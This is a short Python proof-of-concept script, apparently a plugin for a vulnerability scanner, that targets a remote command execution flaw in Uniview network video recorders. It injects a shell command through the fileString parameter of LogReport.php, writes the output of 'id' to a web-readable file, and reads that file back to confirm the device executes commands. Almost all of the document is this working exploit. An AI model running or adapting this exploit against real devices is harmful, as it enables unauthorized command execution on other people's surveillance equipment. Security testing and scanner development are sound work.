#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/iot/宇视科技/浙江宇视科技 网络视频录像机 ISC LogReport.php 远程命令执行漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '浙江宇视科技 网络视频录像机 ISC LogReport.php 远程命令执行',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>qaxqb123.txt'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200:
      res.close()
    else:
      return ret
  except:
    return ret
  try:
    resp=requests.get(url=url+'/Interface/LogReport/qaxqb123.txt',headers=headers,timeout=5)
    if resp.status_code == 200 and re.search(r'uid.*?gid.*?groups.*?',resp.text,re.S):
      resp.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret